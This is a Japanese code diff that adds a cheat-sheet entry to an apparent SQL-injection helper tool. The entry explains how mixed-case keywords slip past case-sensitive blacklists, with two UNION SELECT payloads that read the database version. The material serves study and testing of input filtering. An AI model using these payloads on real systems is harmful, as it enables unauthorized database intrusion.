@@ -969,3 +969,23 @@ const WIZARD = {
     ]
   }
 };
+
+FILTERS.push(
+  { id: "casecap", label: "UNION/union 一致拒否", desc: "大文字・小文字の完全一致でブラックリック検査 (区別一致 / strposやi無しpreg) → Union の先頭大文字/混合で回避" }
+);
+
+PRESETS.push(
+  { label: "UNION/union一致拒否 → Union", ids: ["casecap"] }
+);
+
+CHEATS.push(
+  {
+    t: "区別一致ブラックリスト (UNION と union は消えるが Union は通る)",
+    k: "union Union 先頭大文字 区別一致 strpos preg i無し casecap 交互",
+    d: "<ul><li>PHPの <code>strpos($q,'UNION')!==false || strpos($q,'union')!==false</code> や <b>i フラグ無し</b>の <code>preg_match('/union|select/')</code> は「その綴りそのもの」しか殺せない</li><li>→ <code>Union Select</code> (先頭大文字) や <code>UnIoN sElEcT</code> (交互) がそのまま通る (SQLは大文字小文字不区別なので動作も同じ)</li><li>バイパス設定の <code>UNION/union 一致拒否</code> チップで全ペイロードを先頭大文字化できる (引用符内と 0x 接頭辞は保持)</li><li>対して i フラグ付き/strtolower検査なら混合ケースは全滅 → コメント分割か二重書きへ</li></ul>",
+    p: [
+      "1' Union Select 1,version(),3-- -",
+      "1' UnIoN sElEcT 1,version(),3-- -"
+    ]
+  }
+);
